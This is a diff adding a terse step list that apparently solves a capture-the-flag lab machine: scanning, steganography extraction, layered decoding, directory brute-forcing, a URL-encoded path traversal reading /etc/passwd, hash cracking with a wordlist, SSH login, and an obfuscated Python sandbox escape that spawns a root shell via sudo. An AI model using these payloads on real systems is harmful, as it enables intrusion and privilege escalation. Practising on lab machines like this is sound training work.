@@ -1,0 +1,16 @@
+1 - nmap -A 10.10.64.88
+2 - ftp 10.10.64.88
+3 - ./need_to_talk
+4 - rabin2 -z need_to_talk
+5 - ./need_to_talk 
+6 - steghide extract -sf rize_and_kaneki.jpg
+7 - cat yougotme.txt -> MORSE DECODE -> HEX DECODE -> BASE64 DECODE
+8 - gobuster dir -u http://10.10.64.88/d1r3c70ry_center/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+9 - http://10.10.64.88/d1r3c70ry_center/claim/index.php?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
+10 - john hash -w=/usr/share/wordlists/rockyou.txt
+11 - ssh kamishiro@10.10.64.88
+12 - cat user.txt
+13 - sudo -l
+14 - sudo /usr/bin/python3 /home/kamishiro/jail.py
+15 - __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')
+16 - cat /root/root.txt
